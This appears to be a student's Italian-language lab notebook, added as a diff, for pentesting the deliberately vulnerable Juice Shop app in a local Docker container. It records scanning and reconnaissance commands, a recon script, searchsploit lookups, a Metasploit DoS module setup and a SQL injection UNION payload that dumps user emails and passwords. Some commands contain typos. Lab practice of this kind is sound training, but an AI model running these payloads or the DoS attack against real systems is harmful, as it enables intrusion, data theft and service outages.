@@ -1,0 +1,123 @@
+1. sudo apt-get install nmap
+2. sudo apt-get update
+3. sudo apt-get install -y docker.io
+4. sudo systemctl enable docker --now
+5. (docker --version)
+6. sudo apt-get install -y docker-compose
+7. (sudo usermod -aG docker $USER)
+
+(passaggio intermedio per cartella condivisa)
+->sudo mkdir /mnt/cartella-progetto-comandi
+->sudo mount -t vboxsf cartella-progetto-comandi /mnt/cartella-progetto-comandi
+
+8. docker pull bkimminich/juice-shop
+9. sudo docker save -o /mnt/cartella-progetto-comandi/juice-shop.tar bkimminich/juice-shop
+10. ls /mnt/cartella-progetto-comandi
+11. docker run -d bkimminich/juice-shop
+12. docker ps
+13. docker inspect <nome_container>
+
+
+SCANZIONI GENERALI (nmapscansionebase)
+-> nmap 172.17.0.2 (di base con nmap)
+-> sudo nping -c 1 --tcp -p 3000 172.17.0.2 > /mnt/cartella-progetto-comandi/nmapscansionebase/output-tcp-docker.txt
+-> nmap -A 172.17.0.2 > /mnt/cartella-progetto-comandi/nmapscansionebase/output-nmap-aggressive.txt
+
+
+INFORMATION GATHERING
+->sudo nmap -p 3000 -sV -T4 scanme.org > /mnt/cartella-progetto-comandi/infogathering/output-gathering.txt 
+AUTOMATIZZATO (con script)(auto_gathering.sh)
+->nano auto_gathering.sh
+->contenuto file:
+#!/bin/bash
+IP="172.17.0.2"
+PORT="3000"
+echo "Ping Test"
+ping -c 4 $IP
+echo "Nmap Scan"
+nmap -p $PORT $IP
+echo "Banner Grabbing"
+nc -v $IP $PORT
+echo "Nikto Scan"
+nikto -h http://$IP:$PORT
+echo "Curl Headers"
+curl -I http://$IP:$PORT
+echo "WhatWeb Scan"
+whatweb http://$IP:$PORT
+echo "Dirb Scan"
+dirb http://$IP:$PORT
+->ctrl x per salvare
+-> ./auto_gathering.sh > /mnt/cartella-progetto-comandi/infogathering/autogathering.txt
+
+
+SCANSIONE VULNERABILITA' 
+CON nikto (in cartella nikto_vuln)
+->nikito -host http://172.17.0.0:300 > /mnt/cartella-progetto/vulnassess/nikto_vuln/nikto_scan_output.txt
+
+
+EXPLOITATION (in cartella exploitation)
+-> nmap -p 3000 172.17.0.2
+-> searchsploit jquery 
+
+jquery (DoS/arbitrary file upload exploit) (jquery.txt)
+-> searchsploit -m multiple/dos/49489.html
+-> searchsploit -m php/webapps/46182.py ls (modifica file in 46182-2.py perchè eran in C) (non cambiamento rilevato anche se caricato file)
+
+
+POST-EXPLOITATION (per attacco DoS)
+strumenti: netcat, metasploit
+-> nmap -p- <target_ip> 
+-> curl http://<target_ip>:3000 
+-> sudo apt install metasploit-framework 
+-> msfconsole
+-> search dos
+-> use auxiliary/dos/http/nodejs_pipelining 
+-> show options (vedere porte e host)
+-> set RHOST 172.17.0.2
+   set RPORT 3000
+   set RLIMIT 900000
+-> run
+
+PROVA MANUALE PER SCOPRIRE SCHEMA DB senza tool
+-> q=apple'))UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--
+->ora ho accesso al db ma con alcune info criptate
+->login di prova senza conoscere credenziali come admin
+->riuscito (mail: admin@juice-sh.op,pw: admin123)
+->pw debole !!
+->scritto administration su root di ricerca e ho lista di tutti iscritti e dati sensibili
+
+--------------------------------------------
+COMANDI UTILI
+
+-oA <basename>: Salva l'output in tre formati principali (normale, XML e Grepable) contemporaneamente.
+
+nmap -oA /percorso/alla/cartella/output <altri_opzioni>
+
+nmap 172.17.0.2 > /mnt/cartella-progetto-comandi/nmapscansionebase/output-nmap.txt = per salvare output specifico
+
+------------------------------------------------
+AZIONI
+
+->cartella condivisa 
+1. aprire virtual box
+2. tasto destro sull'icona della macchina virtuale 
+3. settings
+4. shared folders
+5. new 
+6. selezionare cartella
+7. selezionare ultimi due flag
+
+->screen salvati sulla cartella condivisa
+
+->creazione sottocartelle per suddivisione del lavoro
+1. sudo mkdir /mnt/cartella-progetto-comandi/nmapscansionebase
+2. nmap 172.17.0.2 > /mnt/cartella-progetto-comandi/nmapscansionebase/output-nmap.txt
+3. cat /mnt/cartella-progetto-comandi/nmapscansionebase/output-nmap.txt
+
+->creazione e modifica script
+nano "nome file"
+
+----------------------------
+b0dbca22f8a3 (id container docker)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+10.0.2.15
